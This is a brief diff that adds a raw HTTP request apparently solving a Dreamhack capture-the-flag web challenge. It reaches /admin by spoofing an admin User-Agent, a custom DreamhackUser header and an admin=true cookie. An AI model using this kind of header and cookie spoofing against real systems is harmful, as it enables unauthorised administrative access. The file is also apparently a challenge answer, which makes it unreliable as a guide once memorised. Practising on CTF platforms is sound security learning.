@@ -1,0 +1,9 @@
+POST /admin HTTP/1.1
+Host: host3.dreamhack.games
+User-Agent: Admin Browser
+DreamhackUser: admin
+Cookie: admin=true
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 13
+
+userid=admin
